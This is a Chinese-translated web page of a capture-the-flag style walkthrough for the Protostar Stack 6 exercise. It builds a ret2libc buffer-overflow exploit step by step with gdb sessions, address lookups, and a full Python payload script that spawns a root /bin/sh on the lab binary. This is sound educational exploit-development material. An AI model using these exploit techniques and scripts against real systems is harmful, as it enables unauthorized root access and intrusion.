<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Stack 6</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习|原恒星|堆栈6</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6?source=collection_archive---------2-----------------------#2020-05-19">https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6?source=collection_archive---------2-----------------------#2020-05-19</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/d6d034defaa44b1df74fa77c6055e4a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/0*InwyxYU6fD8IhxmV.png"/></div></figure><h1 id="868e" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">堆栈6 (ret2libc)</h1><p id="3c16" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">此挑战的目标是绕过对返回地址的限制，并导致任意代码执行。对返回地址的限制将阻止我们使用堆栈中的任何地址。为了避免这一点，我们将利用一种称为面向返回的编程(“ROP”)或返回到libc(“ret 2 libc”)的技术。</p><ul class=""><li id="2245" class="lt lu it kx b ky lv lc lw lg lx lk ly lo lz ls ma mb mc md bi translated">链接:<a class="ae me" href="https://exploit-exercises.lains.space/protostar/stack6/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/stack6/</a></li></ul><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/a706e0fd9085369aea00959d300fb08c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/0*fidwnWDQHrYcyRA8.png"/></div></figure><h2 id="dfe1" class="mk jy it bd jz ml mm dn kd mn mo dp kh lg mp mq kl lk mr ms kp lo mt mu kt mv bi translated">注意事项</h2><ul class=""><li id="7e64" class="lt lu it kx b ky kz lc ld lg mw lk mx lo my ls ma mb mc md bi translated"><code class="fe mz na nb nc b">gets(buffer);</code>:易受攻击的函数。它从stdin中读取一行，但不检查缓冲区溢出→这容易受到BOF类型的攻击。</li><li id="f538" class="lt lu it kx b ky nd lc ne lg nf lk ng lo nh ls ma mb mc md bi translated"><code class="fe mz na nb nc b">char buffer[64];</code>:这将我们的缓冲区长度限制为64字节。→我们可以输入超过64个字节来引起BOF。</li><li id="e349" class="lt lu it kx b ky nd lc ne lg nf lk ng lo nh ls ma mb mc md bi translated"><code class="fe mz na nb nc b">if((ret &amp; 0xbf000000) == 0xbf000000)</code>:这是对栈上返回地址的限制。我们可以通过检查gdb中的内存映射来确认这一点。</li></ul><h2 id="54c5" class="mk jy it bd jz ml mm dn kd mn mo dp kh lg mp mq kl lk mr ms kp lo mt mu kt mv bi translated">限制</h2><p id="8876" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我解释一下这是如何限制我们使用堆栈地址的。当我们用gdb运行程序并反汇编<code class="fe mz na nb nc b">getpath</code> func时，我们将看到以下计算:</p><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ni"><img src="../Images/a924a798b64d42762a52be1c7eed8445.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5CPBuv-NzfnIhKiP.png"/></div></div></figure><p id="e865" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">所以AND运算(一条ASM逻辑指令)的本质是，如果我们输入任何以<code class="fe mz na nb nc b">0xbf</code>开始的地址，它将对<code class="fe mz na nb nc b">EAX</code>和<code class="fe mz na nb nc b">0xbf000000</code>进行AND运算，并再次比较<code class="fe mz na nb nc b">EAX</code>和<code class="fe mz na nb nc b">0xbf000000</code>。简单来说:</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="d478" class="mk jy it nc b gy nu nv l nw nx">If we want to JMP to an address = 0xbfffff01</span><span id="f548" class="mk jy it nc b gy ny nv l nw nx"><strong class="nc iu">Operation</strong> |    <strong class="nc iu">HEX</strong>    |    <strong class="nc iu">Binary</strong><br/>__________|___________|__________________________________________<br/>                   <br/>           0xbfffff01 = 10111111 11111111 11111111 00000001<br/>      <strong class="nc iu">AND</strong>  0xbf000000 = 10111111 00000000 00000000 00000000<br/>_________________________________________________________________</span><span id="0c61" class="mk jy it nc b gy ny nv l nw nx">           0xbf000000 = 10111111 00000000 00000000 00000000</span><span id="8aab" class="mk jy it nc b gy ny nv l nw nx">This will always end up being 0xbf000000.</span></pre><p id="7a42" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">因此，与我们在<a class="ae me" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-5-c8d085c914e6" rel="noopener"> Stack5 </a>练习中所做的不同(将我们自己的外壳代码引入堆栈，并将我们的JMP指向一个堆栈地址来执行我们的外壳代码)，我们被限制使用这种技术。</p><h1 id="d5ed" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">利用(ret2libc)</h1><p id="a0ac" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">为了规避这种类型的限制，我们可以利用面向返回的编程，特别是ret2libc技术。简单地说，ret2libc基本上是我们将地址返回/跳转到一个名为libc的编程库中。在libc中，有一个syscall叫做<code class="fe mz na nb nc b">system</code>，我们可以用它打开一个shell。</p><h2 id="fc71" class="mk jy it bd jz ml mm dn kd mn mo dp kh lg mp mq kl lk mr ms kp lo mt mu kt mv bi translated">寻找偏移</h2><p id="5adc" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们创建一个python脚本来查找可以控制EIP的偏移值:</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="4415" class="mk jy it nc b gy nu nv l nw nx">#!/usr/bin/python</span><span id="5367" class="mk jy it nc b gy ny nv l nw nx">padding = "A" * 70<br/>padding+= "BBBBCCCCDDDDEEEEFFFFGGGG"</span><span id="390c" class="mk jy it nc b gy ny nv l nw nx">print padding</span></pre><p id="566e" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">然后，在一个文件中创建一个漏洞利用的输出，以便我们可以用gdb运行它。</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="d418" class="mk jy it nc b gy nu nv l nw nx">$ python exploit.py &gt; /tmp/stack6/exploit</span></pre><p id="9d62" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">现在，运行gdb并提供漏洞文件。</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="29af" class="mk jy it nc b gy nu nv l nw nx"><strong class="nc iu">$ gdb -q stack6</strong><br/>  Reading symbols from /opt/protostar/bin/stack6...done.<br/><strong class="nc iu">(gdb) break * getpath</strong><br/>  Breakpoint 1 at 0x80483c4: file stack5/stack5.c, line 7.<br/><strong class="nc iu">(gdb) run &lt; /tmp/stack6/exploit</strong><br/>  Starting program: /opt/protostar/bin/stack6 &lt; /tmp/stack6/exploit  Breakpoint 1, getpath () at stack6/stack6.c:7<br/>  7 stack6/stack6.c: No such file or directory. in stack6/stack6.c<br/><strong class="nc iu">(gdb) continue</strong><br/>  Continuing.<br/>  input path please: got path<br/>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDEEAABBBBCCCCDDDDEEEEFFFFGGGG  Program received signal SIGSEGV, Segmentation fault.<br/> <strong class="nc iu"> 0x45454444</strong> in ?? ()</span></pre><p id="30ed" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">“0x44”和“0x45”在ASCII表示中分别是“D”和“E”。因此，偏移量为80 (= 70 + "BBBBCCCCDD ")。</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="2624" class="mk jy it nc b gy nu nv l nw nx"><strong class="nc iu">...<br/>(gdb) continue</strong><br/>  Continuing.  Program received signal SIGSEGV, Segmentation fault.<br/>  <strong class="nc iu">0x44444343 </strong>in ?? ()                             <br/><strong class="nc iu">(gdb) info registers<br/>  </strong>eax            0x68 104<br/>  ecx            0x0 0<br/>  edx            0xb7fd9340 -1208118464<br/>  ebx            0xb7fd7ff4 -1208123404<br/>  esp            0xbffff7a0 0xbffff7a0<br/>  ebp            0x44444343 0x44444343<br/>  esi            0x0 0<br/>  edi            0x0 0<br/>  <strong class="nc iu">eip            0x45454444 0x45454444</strong>   <strong class="nc iu">&lt;---- EIP Overflowed</strong><br/>  eflags          0x210296 [ PF AF SF IF RF ID ]  eax</span></pre><p id="1b92" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">此外，现在我们可以在崩溃时控制EIP，这意味着我们可以跳转到堆栈中的任何位置。</p><h2 id="8cc8" class="mk jy it bd jz ml mm dn kd mn mo dp kh lg mp mq kl lk mr ms kp lo mt mu kt mv bi translated">查找libc地址</h2><p id="231f" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">运行程序时，我们可以检查哪个libc库正在使用，以及使用gdb的地址空间。</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="5227" class="mk jy it nc b gy nu nv l nw nx"><strong class="nc iu">(gdb) info proc mappings</strong><br/>  process 5503<br/>  cmdline = '/opt/protostar/bin/stack6'<br/>  cwd = '/opt/protostar/bin'<br/>  exe = '/opt/protostar/bin/stack6'</span></pre><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/6ecb89f9ed7fb6a7527acc50f048ad4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/0*tOj7HD2ia-iScUTS.png"/></div></figure><p id="e60c" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">查找<code class="fe mz na nb nc b">system</code>系统调用地址:</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="5bd6" class="mk jy it nc b gy nu nv l nw nx"><strong class="nc iu">(gdb) p system</strong><br/>  $1 = {&lt;text variable, no debug info&gt;} <strong class="nc iu">0xb7ecffb0</strong> &lt;__libc_system&gt;</span></pre><p id="bf1f" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">在libc中查找<code class="fe mz na nb nc b">/bin/sh</code>地址:</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="7999" class="mk jy it nc b gy nu nv l nw nx"><strong class="nc iu">$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"</strong><br/>  <strong class="nc iu">11f3bf</strong> /bin/sh   <br/> <br/>  -a   = Scan entire file<br/>  -t x = Print the offset location of the string in hexdecimal</span><span id="8fda" class="mk jy it nc b gy ny nv l nw nx">To confirm...</span><span id="634d" class="mk jy it nc b gy ny nv l nw nx"><strong class="nc iu">(gdb) x/s 0xb7e97000 + 0x11f3bf   &lt;-- libc start address + offset</strong><br/>  0xb7fb63bf:  "/bin/sh"</span></pre><h2 id="ce25" class="mk jy it bd jz ml mm dn kd mn mo dp kh lg mp mq kl lk mr ms kp lo mt mu kt mv bi translated">漏洞脚本</h2><p id="0c35" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们把所有东西放在一起，创造我们的利用:</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="4c6d" class="mk jy it nc b gy nu nv l nw nx"><strong class="nc iu">[exploit.py]</strong></span><span id="39bd" class="mk jy it nc b gy ny nv l nw nx">#!/usr/bin/python<br/>import struct</span><span id="40cf" class="mk jy it nc b gy ny nv l nw nx"><strong class="nc iu">### EIP Offset</strong><br/>padding = "A" * 80</span><span id="bc82" class="mk jy it nc b gy ny nv l nw nx"><strong class="nc iu">### libc system</strong><br/>system = struct.pack("I", 0xb7ecffb0)</span><span id="01f2" class="mk jy it nc b gy ny nv l nw nx"><strong class="nc iu">### Return Address After system</strong><br/>ret = "\x90" * 4</span><span id="caf2" class="mk jy it nc b gy ny nv l nw nx"><strong class="nc iu">### libc /bin/sh </strong><br/>shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)<br/>print padding + system + ret + shell</span></pre><p id="2796" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">一旦我们使用<code class="fe mz na nb nc b">cat</code>技巧运行上述漏洞利用脚本，无需引入任何外壳代码，我们就可以成功打开一个具有root权限的<code class="fe mz na nb nc b">/bin/sh</code>外壳。</p><pre class="mg mh mi mj gt nq nc nr ns aw nt bi"><span id="ce7d" class="mk jy it nc b gy nu nv l nw nx">$ (python /tmp/stack6/exploit.py; cat) | ./stack6</span></pre><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi oa"><img src="../Images/e1542571870081de3017861f3985a05b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/0*owRIk4WgcC7vQigP.png"/></div></div></figure><p id="f85e" class="pw-post-body-paragraph kv kw it kx b ky lv la lb lc lw le lf lg nn li lj lk no lm ln lo np lq lr ls im bi translated">感谢阅读！</p><h2 id="8713" class="mk jy it bd jz ml mm dn kd mn mo dp kh lg mp mq kl lk mr ms kp lo mt mu kt mv bi translated">下一个挑战:</h2><ul class=""><li id="7ac3" class="lt lu it kx b ky kz lc ld lg mw lk mx lo my ls ma mb mc md bi translated"><a class="ae me" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-7-fea3ac85ffe7" rel="noopener"> <strong class="kx iu">栈7 </strong> </a> —基于栈的BOF: ROP (ret2.text)</li></ul><figure class="mg mh mi mj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nj nk di nl bf nm"><div class="gh gi ob"><img src="../Images/c97268242568b9af008337fbdda0cd45.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*IVMBLmyoj2REaQdd.png"/></div></div></figure></div></div>    
</body>
</html>